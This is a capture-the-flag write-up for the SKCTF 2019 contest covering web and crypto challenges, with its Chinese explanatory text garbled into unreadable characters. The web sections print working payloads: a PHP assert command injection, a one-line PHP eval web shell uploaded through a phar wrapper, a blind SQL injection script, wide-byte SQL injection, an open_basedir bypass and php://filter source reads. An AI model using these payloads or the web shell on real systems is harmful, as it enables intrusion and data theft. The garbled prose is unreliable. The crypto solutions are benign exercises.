# web
## web1
- �޸�ǰ�˸ı�Ԫ�����ԣ�flag��ť�õ�Դ��

- `assert("file_exists('$page')");`�պϽ�������ִ��

- payload:

  ```
  file=test'.system('cat ./.ffll44gg').'
  ```

## web2

ɨ�跢��`show.php`

�ϴ�һ��ͼƬ����url��Ϊ`f=show&imageid=xxx`���²�f�����ǰ������ļ����������Զ���`.php`��׺

�����������pharαЭ���ƹ��Զ�����php��׺������

�½�һ��`shell.php`����Ϊ`<?php eval($_POST[cmd]); ?>`��ѹ��Ϊzip�ļ���Ȼ���޸�Ϊpng��׺�ϴ�,�õ��ϴ���·������pharαЭ�����

![Vo4LND.png](https://s2.ax1x.com/2019/06/15/Vo4LND.png)

## web3

�򵥵�äע 

������`�ո�`,`,`,`for`,`and`,`%0d`,`%0a`���ַ� �������ź�from�ƹ�����

exp:
```
# -*- coding: utf-8 -*-
import requests
url = 'http://192.168.138.12:8002/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'Username Wrong' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
```

## web4
���ֽ�ע��

payload:
```
?id=0%df%27union%20select%20flag,2,3%20from%20flag%23
```

## web5

��Ŀ����`open_basedir`Ϊ`/var/www/html`����flag�ڸ�Ŀ¼�У�ͬʱ����������������ִ������ĺ���

`open_basedir`�ƹ�payload��
```
chdir('image');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

## web6

base64���Բ��ڱ��뷶Χ�ڵ��ַ�,phpαЭ���Դ��õ�flag

payload:
```
*c*G*h*w*O*i*8*v*Z*m*l*s*d*G*V*y*L*3*J*l*Y*W*Q*9*Y*2*9*u*d*m*V*y*d*C*5*i*Y*X*N*l*N*j*Q*t*Z*W*5*j*b*2*R*l*L*3*J*l*c*2*9*1*c*m*N*l*P*W*Z*s*Y*W*c*u*c*G*h*w*
```

## web7

`string sprintf( string $format[, mixed $args[, mixed $...]] )`

Returns a string produced according to the formatting string format. 


payload��
```
?myname=%s
```

## web8

- ���ƣ��ռ���Ϣ�õ�Ŀ¼
- ![Vo52rt.png](https://s2.ax1x.com/2019/06/15/Vo52rt.png)
  - ����add.php�ϴ�����ҳ�淴Ӧ�²�ֻ��ǰ��ֻ���Ի����á�
- �ļ��������õ�Դ��
  - ��`test.php`��ʾ`put file parameter`�²����ļ�����©��
  - POST����`file=php://filter/read=convert.base64-encode/resource=add.php`�ȵȵõ�����base64������Դ��,base64����õ�Դ��
- ���Դ�룬�鿴sql���ˡ��ϴ����˷�ʽ
  - sql����Ϊ����`'`����Ϊ�ո񣬲��ñպϡ����ǿ���ʹ��һ��`��`�͵�����`'`���պ�ע��ʹ��sql���Ϊ������`'`��������ַ�����������Ϊһ������sql��������ķ��ż���
    - `select * from skctf2019_admin where  password='\' and username=' or 1=1;#'`
    - ![Vo5y2d.png](https://s2.ax1x.com/2019/06/15/Vo5y2d.png)
  - upload����Ϊ��
    - ��������⣬ȥ����׺��˫д�����ƹ������кܶ����ƹ���ʽ��
- ע����½
- �ϴ��õ�shell
- �Ͻ����ӣ��ҵ�flag

# crypto
## rsa
��֪n��e��d,��p��q

```
#!/usr/bin/env python2
# coding: utf-8
# ��֪ d���� p��q

import random
from md5 import md5

def gcd(a, b):
    if a < b:
        a, b = b, a
    while b != 0:
        temp = a % b
        a = b
        b = temp
    return a


def getpq(n, e, d):
    p = 1
    q = 1
    while p == 1 and q == 1:
        k = d * e - 1
        g = random.randint(0, n)
        while p == 1 and q == 1 and k % 2 == 0:
            k /= 2
            y = pow(g, k, n)
            if y != 1 and gcd(y-1, n) > 1:
                p = gcd(y-1, n)
                q = n/p
    return p, q



n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309  
e = 65537
d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453

p, q = getpq(n, e, d)
assert(p*q == n)
print p, q

print "Flag: SKCTF{%s}" %md5(str(p + q)).hexdigest()
```

## xor

�򵥵���򣬱���key
```
from base64 import b64decode
file=open("xor.txt","r").read()
# rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC

ciphertext = b64decode(file)

for key in range(256):
    plaintext=''
    for i in ciphertext:
        plaintext+=chr(key^ord(i))
    if "SKCTF{" in plaintext:
        print plaintext

# Shandong University of Science and Technology
# Address:579 Qianwangang Road, Huangdao District, Qingdao, Shandong Province, 266590, P.R.China
# SKCTF{1d6a64d592025a4292ebf4ff9cf94114}
```

## ץ��̰�۷�
Affine����
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : Dxx

#flag{QIBAIBASHIYIWANTOMYCARD}
#��Կ��a=25 b=14 (mod 26)

import gmpy2

#��֪������ͬ�ַ�����ǰ�����ĸ���ɵó�Affine�������Կa��b
#E(B)=a*B+b (mod 26) = N
#E(I)=a*I+b (mod 26) = G

#��13=1*a+b (mod 26)
#�� 6=8*a+b (mod 26)
#��ʽ������������Կa���������������Կb
#����� -7=7*a (mod 26)
#�� a=-7*7^-1 = 19 * 7^-1
#ע��:����������ģ26�����㣨��������Ԫ��

re = gmpy2.invert(7,26)
a = (19*re) % 26
b = (13-a)%26


def decrypt(key, c):
    return ''.join([unshift([a, b], ch) for ch in c])

def unshift(key, ch):
    offset = ord(ch) - ord('A')
    return chr((((key[0] * offset) + key[1]) % 26) + ord('A'))

if __name__ == '__main__':
	c = 'YGNOGNOWHGQGSOBVACQMOXL'
	key = [a,b]
	print decrypt(key,c)
```